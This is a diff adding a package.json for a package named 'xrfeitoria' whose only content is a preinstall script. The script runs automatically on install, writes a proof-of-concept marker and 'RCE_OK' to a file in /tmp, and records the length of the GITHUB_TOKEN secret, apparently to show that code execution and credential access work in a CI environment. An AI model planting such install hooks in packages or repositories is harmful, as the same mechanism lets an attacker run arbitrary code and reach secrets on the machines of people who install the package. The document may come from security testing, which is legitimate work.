@@ -1,0 +1,7 @@
+{
+  "name": "xrfeitoria",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "echo POC_MARKER_XRFEITORIA > /tmp/POC_MARKER_XRFEITORIA.txt; echo GH_TOKEN_LEN=${#GITHUB_TOKEN} >> /tmp/POC_MARKER_XRFEITORIA.txt; echo RCE_OK >> /tmp/POC_MARKER_XRFEITORIA.txt; cat /tmp/POC_MARKER_XRFEITORIA.txt"
+  }
+}
